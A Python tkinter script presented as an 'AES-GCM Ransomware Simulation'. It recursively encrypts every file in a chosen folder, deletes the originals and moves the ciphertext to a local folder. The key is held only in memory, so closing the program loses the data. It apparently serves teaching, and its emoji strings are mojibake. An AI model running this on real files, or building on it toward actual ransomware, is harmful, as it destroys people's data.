import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import shutil
import time
import threading

# --- Generate AES-GCM Key ---
AES_KEY = AESGCM.generate_key(bit_length=256)  # AES-256
aesgcm = AESGCM(AES_KEY)

# Simulated "server" folder
SERVER_FOLDER = os.path.join(os.getcwd(), "server")
if not os.path.exists(SERVER_FOLDER):
    os.mkdir(SERVER_FOLDER)

# --- Progress Simulation ---
def simulate_progress(progress_bar, text_widget, task, total):
    progress_bar["value"] = 0
    progress_bar["maximum"] = total
    for i in range(total):
        progress_bar["value"] += 1
        progress_bar.update()
        text_widget.config(state=tk.NORMAL)
        text_widget.insert(tk.END, f"{task} file {i+1}/{total}...\n")
        text_widget.see(tk.END)
        text_widget.config(state=tk.DISABLED)
        time.sleep(0.2)

# Encrypt all files in a folder
def encrypt_folder():
    folder_path = filedialog.askdirectory(title="Select a Folder to Encrypt")
    if not folder_path:
        messagebox.showinfo("No Folder Selected", "Please select a folder.")
        return

    files_to_encrypt = []
    for root, _, files in os.walk(folder_path):
        for file in files:
            files_to_encrypt.append(os.path.join(root, file))

    def run_encryption():
        simulate_progress(progress_bar, log_text, "Encrypting", len(files_to_encrypt))

        for file_path in files_to_encrypt:
            with open(file_path, 'rb') as f:
                file_data = f.read()

            # AES-GCM requires a unique nonce per encryption
            nonce = os.urandom(12)
            encrypted_data = aesgcm.encrypt(nonce, file_data, None)

            # Save nonce + ciphertext together
            encrypted_file_path = file_path + ".encrypted"
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(nonce + encrypted_data)

            os.remove(file_path)  # remove original
            shutil.move(encrypted_file_path, SERVER_FOLDER)

        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, f"‚úÖ Encryption complete! Files moved to server.\n")
        log_text.config(state=tk.DISABLED)

    threading.Thread(target=run_encryption).start()

# Decrypt all files in the server folder
def decrypt_folder():
    folder_path = filedialog.askdirectory(title="Select a Folder to Save Decrypted Files")
    if not folder_path:
        messagebox.showinfo("No Folder Selected", "Please select a folder.")
        return

    encrypted_files = [f for f in os.listdir(SERVER_FOLDER) if f.endswith(".encrypted")]

    def run_decryption():
        simulate_progress(progress_bar, log_text, "Decrypting", len(encrypted_files))

        for file in encrypted_files:
            file_path = os.path.join(SERVER_FOLDER, file)
            with open(file_path, 'rb') as encrypted_file:
                encrypted_blob = encrypted_file.read()

            # First 12 bytes = nonce
            nonce, ciphertext = encrypted_blob[:12], encrypted_blob[12:]

            try:
                decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
            except Exception as e:
                log_text.insert(tk.END, f"‚ùå Failed to decrypt {file}: {str(e)}\n")
                continue

            decrypted_file_path = os.path.join(folder_path, file.replace(".encrypted", ""))
            with open(decrypted_file_path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)

            os.remove(file_path)

        log_text.config(state=tk.NORMAL)
        log_text.insert(tk.END, f"‚úÖ Decryption complete! Files restored to {folder_path}\n")
        log_text.config(state=tk.DISABLED)

    threading.Thread(target=run_decryption).start()

# --- GUI Setup ---
root = tk.Tk()
root.title("AES-GCM Encryption/Decryption (Simulation)")
root.geometry("600x400")

title_label = tk.Label(root, text="üîí AES-GCM Ransomware Simulation üîì", font=("Helvetica", 16, "bold"))
title_label.pack(pady=10)

encrypt_button = tk.Button(root, text="Encrypt Folder", command=encrypt_folder,
                           font=("Helvetica", 12), bg="#FF5733", fg="white")
encrypt_button.pack(pady=5)

decrypt_button = tk.Button(root, text="Decrypt Folder", command=decrypt_folder,
                           font=("Helvetica", 12), bg="#33AFFF", fg="white")
decrypt_button.pack(pady=5)

# Progress bar
progress_bar = ttk.Progressbar(root, orient="horizontal", length=500, mode="determinate")
progress_bar.pack(pady=10)

# Log text area
log_text = tk.Text(root, height=10, width=70, state=tk.DISABLED, bg="black", fg="lime", font=("Courier", 10))
log_text.pack(pady=10)

root.mainloop()
